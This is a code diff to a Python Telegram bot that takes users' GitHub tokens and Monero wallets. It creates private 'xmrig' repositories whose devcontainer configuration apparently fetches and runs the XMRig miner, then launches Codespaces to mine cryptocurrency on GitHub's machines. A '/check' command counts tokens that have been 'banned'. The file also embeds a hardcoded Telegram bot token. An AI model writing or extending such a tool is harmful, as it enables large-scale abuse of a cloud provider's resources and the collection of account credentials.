@@ -1,20 +1,19 @@
 import os
+import time
 import sqlite3
 import requests
 import base64
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
-BOT_TOKEN = "8067230426:AAGmGeSe7P7hlnvoCPsw7mDpm1qbtnhASq0"
+BOT_TOKEN = "8067230426:AAGmGeSe7P7hlnvoCPsw7mDpm1qbtnhASq0"  # <- Replace with your bot token
 
-# Database setup
 conn = sqlite3.connect("data.db", check_same_thread=False)
 c = conn.cursor()
 c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, wallet TEXT)")
 c.execute("CREATE TABLE IF NOT EXISTS tokens (user_id INTEGER, token TEXT)")
 conn.commit()
 
-# Upload files to GitHub repo
 def upload_file(token, username, repo, filename, content):
     encoded = base64.b64encode(content.encode()).decode()
     return requests.put(
@@ -23,7 +22,6 @@ def upload_file(token, username, repo, filename, content):
         json={"message": f"Add {filename}", "content": encoded, "branch": "main"}
     )
 
-# Create 2 repos and start 2 Codespaces
 def create_two_repos_and_codespaces(github_token, wallet):
     headers = {"Authorization": f"token {github_token}"}
     user_info = requests.get("https://api.github.com/user", headers=headers).json()
@@ -31,7 +29,6 @@ def create_two_repos_and_codespaces(github_token, wallet):
     if not username:
         return None, False
 
-    # Content for files
     files = {
         "devcontainer.json": '''{
   "name": "XMRig Codespace",
@@ -47,8 +44,8 @@ chmod +x xmrig
         "README.md": "# Auto mining repo"
     }
 
-    for _ in range(2):  # Two repos
-        repo_name = f"xmrig-{os.urandom(4).hex()}"
+    for _ in range(2):
+        repo_name = f"xmrig-{os.urandom(3).hex()}"
         repo_resp = requests.post("https://api.github.com/user/repos", headers=headers, json={
             "name": repo_name,
             "private": True,
@@ -60,8 +57,9 @@ chmod +x xmrig
         for fname, content in files.items():
             upload_file(github_token, username, repo_name, fname, content)
 
-        # Start Codespace
-        requests.post(
+        time.sleep(8)  # ⏳ Ensure repo is fully available before Codespace start
+
+        resp = requests.post(
             "https://api.github.com/user/codespaces",
             headers={**headers, "Accept": "application/vnd.github+json"},
             json={
@@ -71,10 +69,11 @@ chmod +x xmrig
                 "machine": "standardLinux"
             }
         )
+        print("[Codespace]", resp.status_code, resp.text)
 
     return username, True
 
-# /wallet command
+# Telegram command: /wallet <XMR_wallet>
 async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if len(context.args) != 1:
@@ -85,7 +84,7 @@ async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.commit()
     await update.message.reply_text("✅ Wallet saved! You're ready to mine.")
 
-# /token command
+# Telegram command: /token <ghp_...>
 async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not context.args:
@@ -110,7 +109,7 @@ async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(reply.strip())
 
-# /check command
+# Telegram command: /check
 async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     c.execute("SELECT token FROM tokens WHERE user_id = ?", (user_id,))
@@ -124,10 +123,10 @@ async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             banned += 1
     total = active + banned
     await update.message.reply_text(
-        f"👤 Your GitHub Token Status\n━━━━━━━━━━━━━━━\n✅ Active: {active}\n❌ Banned: {banned}\n💾 Total: {total}\n━━━━━━━━━━━━━━━"
+        f"👤 Your GitHub Token Status\\n━━━━━━━━━━━━━━━\\n✅ Active: {active}\\n❌ Banned: {banned}\\n💾 Total: {total}\\n━━━━━━━━━━━━━━━"
     )
 
-# Run the bot
+# Bot run
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 app.add_handler(CommandHandler("wallet", wallet))
 app.add_handler(CommandHandler("token", token))
